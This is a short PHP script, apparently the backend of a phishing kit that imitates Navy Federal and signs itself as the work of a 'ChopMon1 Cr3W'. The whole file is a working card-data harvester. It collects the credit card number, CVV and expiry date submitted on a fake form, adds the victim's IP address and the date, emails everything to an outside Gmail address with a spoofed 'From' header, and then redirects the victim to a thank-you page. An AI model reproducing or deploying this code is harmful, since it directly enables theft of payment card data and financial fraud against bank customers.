<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "==================Personal Information==================\n";
$message .= "Credit Card Number:".$_POST['comboLogoncc']."\n";
$message .= "CVV/CV2:".$_POST['comboLogonexp']."\n";
$message .= "Expiration Date:".$_POST['cvv']."\n";
$message .= "======================================\n";
$message .= "IP:NavyFed: ".$ip."\n"; 
$message .= "Date: ".$adddate."\n";
$message .= "================Created By ChopMon1 Cr3W===============\n";
$recipient = "gboymoni67@gmail.com";
$subject = "NavyFed: ".$ip."\n"; // change subject if you like
$headers = "From: Navy <docs@consultant.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: Thanks.php");

	   }


?>